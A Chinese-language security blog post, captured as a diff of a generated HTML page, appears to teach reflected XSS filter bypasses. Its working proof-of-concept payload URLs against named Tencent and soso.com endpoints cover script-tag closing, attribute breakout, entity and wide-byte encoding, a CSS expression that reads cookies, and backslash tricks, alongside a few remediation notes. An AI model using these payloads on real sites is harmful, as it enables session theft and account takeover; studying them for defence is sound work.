@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="什么都没过滤的入门情况 XSS 的存在，一定是伴随着输入，与输出 2 个概念的。 要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。 如果输入和输出都没过滤。 那么漏洞将是显而易见的。 作为第一个最基础的例子， 我们拿出的是一个什么都没过滤（其实还是有些转义的，主要没过滤&amp;lt; , &amp;gt;）的例子。 这种例子出现在 腾讯这种大网站的概率不是很高。 但是还是让我找到了一个。  首先">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="那些年我们一起学XSS 总结">
+<meta property="og:url" content="https://wh0ale.github.io/2019/03/19/2019-3-19-那些年我们一起学XSS/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="什么都没过滤的入门情况 XSS 的存在，一定是伴随着输入，与输出 2 个概念的。 要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。 如果输入和输出都没过滤。 那么漏洞将是显而易见的。 作为第一个最基础的例子， 我们拿出的是一个什么都没过滤（其实还是有些转义的，主要没过滤&amp;lt; , &amp;gt;）的例子。 这种例子出现在 腾讯这种大网站的概率不是很高。 但是还是让我找到了一个。  首先">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17wej82dyj20k60a90xe.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17z5bp2agj20pw0h5qfp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zk9ygnqj20o50ho44l.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zkgxjjej20ns0j0gwz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zm8s357j20jx0hr3zb.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zmj3fbgj20kh0id0ye.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zms133fj20jh0i241s.jpg">
+<meta property="og:updated_time" content="2019-12-03T06:13:26.779Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="那些年我们一起学XSS 总结">
+<meta name="twitter:description" content="什么都没过滤的入门情况 XSS 的存在，一定是伴随着输入，与输出 2 个概念的。 要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。 如果输入和输出都没过滤。 那么漏洞将是显而易见的。 作为第一个最基础的例子， 我们拿出的是一个什么都没过滤（其实还是有些转义的，主要没过滤&amp;lt; , &amp;gt;）的例子。 这种例子出现在 腾讯这种大网站的概率不是很高。 但是还是让我找到了一个。  首先">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17wej82dyj20k60a90xe.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/03/19/2019-3-19-那些年我们一起学XSS/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>那些年我们一起学XSS 总结 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/03/19/2019-3-19-那些年我们一起学XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">那些年我们一起学XSS 总结
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-19 00:00:00" itemprop="dateCreated datePublished" datetime="2019-03-19T00:00:00+08:00">2019-03-19</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-03 14:13:26" itemprop="dateModified" datetime="2019-12-03T14:13:26+08:00">2019-12-03</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">8.5k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">8 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="什么都没过滤的入门情况"><a href="#什么都没过滤的入门情况" class="headerlink" title="什么都没过滤的入门情况"></a>什么都没过滤的入门情况</h1><ol>
+<li>XSS 的存在，一定是伴随着输入，与输出 2 个概念的。</li>
+<li>要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。</li>
+<li>如果输入和输出都没过滤。 那么漏洞将是显而易见的。</li>
+<li>作为第一个最基础的例子， 我们拿出的是一个什么都没过滤（其实还是有些转义的，主要没过滤&lt; , &gt;）的例子。 这种例子出现在<br> 腾讯这种大网站的概率不是很高。 但是还是让我找到了一个。</li>
+</ol>
+<p>首先手动输入payload看源码，找到输入的payload所在位置（比如score=aaaaaaaaaa&#39;&quot;&gt;<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>）</p>
+<p>可以在源码看到他的输出情况例如</p>
+<ol>
+<li>&lt; &gt; 是否被转义</li>
+<li>单引号 双引号是否被转义</li>
+<li>/ 可用吗</li>
+</ol>
+<h1 id="输出在-lt-script-gt-lt-script-gt-之间的情况"><a href="#输出在-lt-script-gt-lt-script-gt-之间的情况" class="headerlink" title="输出在&lt;script&gt;&lt;/script&gt;之间的情况"></a>输出在&lt;script&gt;&lt;/script&gt;之间的情况</h1><p>2.1 首先判断，是否过滤了 &lt; , &gt; , / 等符号</p>
+<p>2.2 如果<strong>都没有过滤</strong>，恭喜你，一般可以直接 XSS 了。代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">type=&apos;text/javascript&apos;&gt;document.domain=&apos;soso.com&apos;;_ret=&#123;&quot;_res&quot;:2&#125;;try&#123;parent.aaa(_ret);&#125;catch(err)&#123;aaa(_ret);&#125;&lt;/scrip</span><br><span class="line">t&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造后的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">type=&apos;text/javascript&apos;&gt;document.domain=&apos;soso.com&apos;;_ret=&#123;&quot;_res&quot;:2&#125;;try&#123;parent.aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/scri</span><br><span class="line">pt&gt;(_ret);&#125;catch(err)&#123;aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;(_ret);&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在过滤&gt; &lt; 的情况下我们可以使用其他的payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'alert(1)'</span>);<span class="keyword">void</span></span><br></pre></td></tr></table></figure>
+
+<p>构造后的结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">type=&apos;text/javascript&apos;&gt;document.domain=&apos;soso.com&apos;;_ret=&#123;&quot;_res&quot;:2&#125;;try&#123;parent.eval(&apos;alert(1)&apos;);void(_ret);&#125;catch(err)&#123;</span><br><span class="line">eval(&apos;alert(1)&apos;);void(_ret);&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>主要还是看payload 附近的源码是怎么样的，该如何去闭合他执行我们所输入的js嗲吗</strong></p>
+<h1 id="输出在-HTML-属性里的情况"><a href="#输出在-HTML-属性里的情况" class="headerlink" title="输出在 HTML 属性里的情况"></a>输出在 HTML 属性里的情况</h1><p>和前面的不一样的时，有时候，输出会出现在 HTML 标签的属性之中。</p>
+<h2 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">&lt;input value=<span class="string">"输出"</span>&gt;</span><br><span class="line">&lt;img onload=<span class="string">"...[输出]..."</span>&gt;</span><br><span class="line">&lt;body style=<span class="string">"...[输出]..."</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们需要把注意点放在 输出 点中</p>
+<p>例如</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键词：&lt;input type=<span class="string">"text"</span> value=<span class="string">"乌云欢迎您"</span> /&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx.com/search.php?word=乌云欢迎您&quot; onclick=&quot;alert(1) 	#闭合前面的双引号  当用户点击这个文本框时就会触发alert（1）</span><br><span class="line">&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt; 		#这是对应的源代码</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御方法：</strong></p>
+<p>将 <code>&quot;</code> 过滤为<code>&amp;quot;</code></p>
+<p>过滤后的代码<code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&amp;quot; onclick=&amp;quot;alert(1)&quot; /&gt;</code></p>
+<h2 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h2><p>查看payload 的所在位置</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17wej82dyj20k60a90xe.jpg" alt></p>
+<p>没有过滤 \ ，反斜线， 而 css 里，允许使用转义字符, \ + ascii16 进制形式。这样一来，我们就可以构造利用语<br>句啦。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=</span><br><span class="line">;<span class="selector-tag">w</span><span class="selector-pseudo">:expr</span>\65<span class="selector-tag">ssion</span>\28%20<span class="selector-tag">eval</span>\28\27\69\66\28\21\7</span><br><span class="line">7\69\6<span class="selector-tag">e</span>\64\6<span class="selector-tag">f</span>\77\2<span class="selector-tag">e</span>\78\29\7<span class="selector-tag">b</span>\61\6<span class="selector-tag">c</span>\65\72\74\28\64\6<span class="selector-tag">f</span>\63\75\6<span class="selector-tag">d</span>\65\6<span class="selector-tag">e</span>\74\2<span class="selector-tag">e</span>\63\6<span class="selector-tag">f</span>\6<span class="selector-tag">f</span>\6<span class="selector-tag">b</span>\69\65\29\3<span class="selector-tag">b</span>\77\69\6<span class="selector-tag">e</span>\64\6<span class="selector-tag">f</span>\77\2</span><br><span class="line">e\78\3d\31\7d\27\29\29&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qin</span><br><span class="line"><span class="selector-tag">gfengxu6685</span>,<span class="selector-tag">zhouzhichen001</span>,<span class="selector-tag">yuguoming-ruc</span>,<span class="selector-tag">luomingtitan</span>,<span class="selector-tag">bjwbgq</span>,<span class="selector-tag">kezuozongbianji</span>,<span class="selector-tag">weibotalk</span>,<span class="selector-tag">lee007</span>,<span class="selector-tag">jxzhongweizhi</span>,<span class="selector-tag">lihaipeng</span></span><br><span class="line"><span class="selector-tag">tx</span></span><br></pre></td></tr></table></figure>
+
+<p>遗憾之处在于，基于 <strong>css expression</strong> 的 XSS 已经进入暮年了，只有在 IE6，7 下方能触发，受众面小。这里只是作为一个<br>案例来讲讲。<br>Tips: 至于这里的转义是如何写的：步骤如下：<br>例如 e 的 ascii 16 进制是 65, 我们就写为  expression -&gt; expr\65ssion</p>
+<h2 id="src-href-action-xlink-href-autofocus-content-data-等属性"><a href="#src-href-action-xlink-href-autofocus-content-data-等属性" class="headerlink" title="src/href/action/xlink:href/autofocus/content/data 等属性"></a>src/href/action/xlink:href/autofocus/content/data 等属性</h2><p>常规来说，因为 <code>onxxxx=&quot;[输出]&quot;</code>和 <code>href=&quot;javascript:[输出]&quot;</code> 与 <code>&lt;script&gt;[输出]&lt;/script&gt;</code>没有太大区别。因为[输出]所在的地<br>方，都是 javascript 脚本。但是<code>&lt;script&gt;[输出]&lt;/script&gt;</code>如果被过滤，往往没有太好的办法。而上面这 2 种情况，则有一个很好的办法绕过过滤。<br>Tips:</p>
+<p>在 HTML 属性中，<strong>会自动对实体字符进行转义</strong>。一个简单的比方。</p>
+<p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
+<p>和</p>
+<p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt;</code></p>
+<p>是等效的</p>
+<p>换言之，只要上面的情况，<strong>没有过滤 &amp;，# 等符号</strong>，我们就可以写入任意字符。</p>
+<p>JS 部分我们可以做以下构造,由于&#39;被过滤，我们可以将&#39;写为 <code>&amp;#x27;</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">'........&amp;searchvalue_yjbg=aaaaaa'</span></span><br><span class="line"></span><br><span class="line">location.href=<span class="string">'........&amp;searchvalue_yjbg=aaaaaa'</span>+alert(<span class="number">1</span>)+<span class="string">''</span></span><br><span class="line"></span><br><span class="line">location.href=<span class="string">'........&amp;searchvalue_yjbg=aaaaaa&amp;#x27;+alert(1)+&amp;#x27;'</span></span><br></pre></td></tr></table></figure>
+
+<p>步骤如下：</p>
+<p>接着我们把代码转换为 url 的编码。 &amp;-&gt; %26, # -&gt; %23</p>
+<p>最后利用代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%2</span></span><br><span class="line"><span class="number">6</span>%<span class="number">23</span>x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复方案：</strong></p>
+<ol>
+<li>对于输出在 HTML 属性中的情况，需要特殊情况特殊对待，该过滤\的时候，请过滤, 该过滤&amp;的情况，则过滤掉&amp;</li>
+<li>碰到有某些修复的人用正则去判断， &amp;#xNNN.., 而实际上 &#x0NN; &amp;#x00NN, （后面自己慢慢试。。） 都是可以的。 或者是 &amp;#10<br> 进制; 以及一些特殊的 HTML 实体，如 &quot;等，都要注意到，好麻烦， 最好的办法，还是 &amp;过滤为 &amp; ：</li>
+</ol>
+<h2 id="on-事件"><a href="#on-事件" class="headerlink" title="on 事件"></a>on 事件</h2><p>插入合乎逻辑的JS代码即可。也可以使用伪协议。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">onload</span><br><span class="line">onclick</span><br><span class="line">onunload</span><br><span class="line">onchange</span><br><span class="line">onsubmit</span><br><span class="line">onreset</span><br><span class="line">onselect</span><br><span class="line">onblur</span><br><span class="line">onfocus</span><br><span class="line">onabort</span><br><span class="line">onkeydown</span><br><span class="line">onkeypress</span><br><span class="line">onkeyup</span><br><span class="line">ondbclick</span><br><span class="line">onmouseover</span><br><span class="line">onmousemove</span><br><span class="line">onmouseout</span><br><span class="line">onmouseup</span><br><span class="line">onforminput</span><br><span class="line">onformchange</span><br><span class="line">ondrag</span><br><span class="line">ondrop</span><br></pre></td></tr></table></figure>
+
+<h1 id="宽字节复仇记"><a href="#宽字节复仇记" class="headerlink" title="宽字节复仇记"></a>宽字节复仇记</h1><p>如果不在属性内，且双引号被过滤的情况下（&quot; 转义为 <code>&amp;quot</code>） ,我们可以使用宽字符绕过，类似sql注入</p>
+<p>前提是编码支持中文</p>
+<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;		 # gb**** 系列的都可以使用宽字符注入</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa</span><br></pre></td></tr></table></figure>
+
+<p>至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。并不是因为<code>%22</code> 变 成了 <code>%5c%22</code>,而 <code>%c0</code> 吃掉了后面的<code>%5c</code>。 而后面这种情况，在腾讯的相关站点暂时没有发现实际案例。 如果有，欢迎大家分享。</p>
+<h1 id="反斜线复仇记"><a href="#反斜线复仇记" class="headerlink" title="反斜线复仇记"></a>反斜线复仇记</h1><p>如果有遇到写双引号被转义，且不再属性内，又没有中文编码的情况下 可以根据情况使用<code>\</code> 进行绕过</p>
+<p>漏洞处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;;//后面省略。   这里输入点&quot; 转义为 &amp;quot</span><br><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa&amp;quot+&quot;&amp;from=bbb&amp;quot+&quot;&amp;param=&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以控制的是 aaaa ，又不能用&quot;，怎么办呢？</p>
+<p>因为我们可以使用 \，那么我们可以杀掉 aaaa 后面的 双引号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>为了保证 bbb 后面的语法正确性，我们把 bbb 改为一个数字，把 bbb 后面加上 // 来注释掉后面的部分。变成以下形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=1//&quot;+&quot;&amp;param=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是会出来一些问题，&quot;字符串&quot;&amp;from=1，这样是错误的，因为&amp;符号的优先级高， (&quot;字符串&quot;&amp;from)=1 是无法进行这种赋值操作的。这样一来还是不行。别着急。我们可以稍微改动一下。变为以下形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1//&quot;+&quot;&amp;param=&quot;;		#由于==的优先级比 &amp; 高，所以语句相当于 (&quot;字符串&quot;)&amp;(from==1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>由于 from 未定义，直接和 1 进行相等判断的话，会报错，错误是：“from”未定义。。。怎么办呢？</strong></p>
+<p>javascript 里有一个特性。 如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aaa();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>凡是以 function xxx(){} 形式定义的函数，都会被最优先解析。</p>
+<p>利用这样一个特性，我们的代码可以改改。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"........."</span>+<span class="string">"&amp;ss=aaaa\"+"</span>&amp;<span class="keyword">from</span>==<span class="number">1</span>;<span class="function"><span class="keyword">function</span> <span class="title">from</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//"+"&amp;param=";</span></span><br><span class="line">这样一来，我们的 <span class="function"><span class="keyword">function</span> <span class="title">from</span>(<span class="params"></span>)</span>&#123;&#125; 就会被提前解析，从而定义了 <span class="keyword">from</span>, 后面 <span class="keyword">from</span>==<span class="number">1</span> 的时候，就不会报错啦</span><br></pre></td></tr></table></figure>
+
+<p>我们的空格被转义为了<code>&amp;nbsp;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终使用反斜线为 双引号报仇</strong></p>
